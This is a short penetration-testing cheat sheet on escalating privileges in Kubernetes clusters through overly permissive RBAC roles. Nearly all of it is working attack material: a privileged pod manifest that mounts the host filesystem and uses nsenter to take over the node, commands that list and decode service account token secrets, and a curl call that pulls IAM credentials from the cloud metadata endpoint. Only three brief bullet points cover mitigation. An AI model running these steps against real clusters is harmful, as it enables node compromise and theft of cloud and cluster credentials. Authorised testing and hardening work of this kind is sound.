# Kubernetes RBAC Privilege Escalation

Enumerating and abusing overly permissive RBAC roles in K8s clusters.

## Enumerate Permissions

```bash
# What can I do?
kubectl auth can-i --list

# Check specific actions
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i exec into pods
```

## Common Escalation Paths

### 1. Pod Creation -> Node Access

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

```bash
kubectl apply -f privesc.yaml
kubectl exec privesc -- chroot /host bash
```

### 2. Secret Access

```bash
# If you can get secrets, extract tokens
kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'

# Decode service account token
kubectl get secret <sa-token> -o jsonpath='{.data.token}' | base64 -d
```

### 3. Exec into pods -> cloud metadata

```bash
kubectl exec -it <pod> -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Mitigation

- Apply least privilege: no `verbs: ["*"]` on `resources: ["*"]`
- Block privileged pods via PodSecurityPolicy
- Use `kubectl auth can-i --list` in CI to audit service accounts
